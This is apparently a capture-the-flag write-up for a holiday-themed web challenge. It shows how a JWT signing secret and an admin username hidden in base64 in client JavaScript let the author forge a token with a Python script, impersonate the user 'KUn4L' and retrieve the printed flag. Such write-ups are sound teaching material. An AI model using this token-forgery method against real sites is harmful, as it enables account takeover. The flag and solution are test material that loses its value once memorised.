It seems like the Secret Society of K.U.N.A.L has invested in another business…Oh no.

If those planes come anywhere close to Santa—after his “adventure” in France—he’ll be scathed for good. Those reindeer don’t like inhaling kerosene!

Agent, we need you to infiltrate their system and gather some information for our engineers at Elves Intelligence. We believe the plane they’re using is a bit special…it may have been custom-built for K.U.N.A.L himself!

Here’s their website, agent: [https://jets.csd.lol/](https://jets.csd.lol/). Best of luck.

# Solution

when we go to the website, we can see the sign up option on the screen, so let's sign up using random credentials.

Once we sign up, we can go to `Storage` in our DevTools, where we see a cookie named `token`.

We can easily decrypt the Value of the token using [jwt.io](https://jwt.io) which can help us decode this JSON Web Token.

Encrypted Token :

``` json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3MzU0NDM5MjcsImV4cCI6MTczNTQ0NzUyNywic3ViIjoidGVzdCJ9.qW6uinpVkLKBAbLpwTiGH9dxElp7mMosW9DhuwPfZ9U
```

Decrypted Token :

``` json
{
  "iat": 1735443927,
  "exp": 1735447527,
  "sub": "test"
}
```

Here, `iat` and `exp` are time stamps, and `sub` is the username

Now, let's look at the source code. an interesting part of the js code is:

```js
if (token) {
  const { sub } = jwtDecode(token, {
    secret: atob("MWRkMjJiYjQyNzBjYjE0NTcyMzIyZTAzNDI1YzAwNTgzZTAyYmY2M2Y1YzdhZjdkMmYzODdlMjRlN2Q1YjkzMQ=="),
  });
  console.log(sub);

  if (sub === atob("S1VuNEw=")) {
    footer.style.display = "block";
  }
```

In this example, we can see that `secret` is used for securing and validating JWT, and `sub` which is an username. both are encrypted in base64, so let's decode them.

```
secret : 1dd22bb4270cb14572322e03425c00583e02bf63f5c7af7d2f387e24e7d5b931
sub : KUn4L
```

to sign in KUn4L's account, we have to generate a JWT with their user id, time and we have to sign it with `secret` .

Here's the code in python that does exactly that:
```python
import jwt
import time

secret = "1dd22bb4270cb14572322e03425c00583e02bf63f5c7af7d2f387e24e7d5b931"

payload = {
    "iat": int(time.time()),  
    "exp": int(time.time()) + 3600, 
    "sub": "KUn4L"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

let's run the code:

```
jstr$ python main.py
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3MzU0NDcwNDEsImV4cCI6MTczNTQ1MDY0MSwic3ViIjoiS1VuNEwifQ.0cVePmTMBbm5u6RVaYSDOScCmpn5HOIJV8fhvcVbd6E
```

we can now switch the `token` value by putting this JWT instead of the old one.

when we reload the website after switching JWT, the third picture we see, is a Walmart bag, which has the flag: `csd{Wh47_D1D_KUN4I_do_7h1S_71M3}`
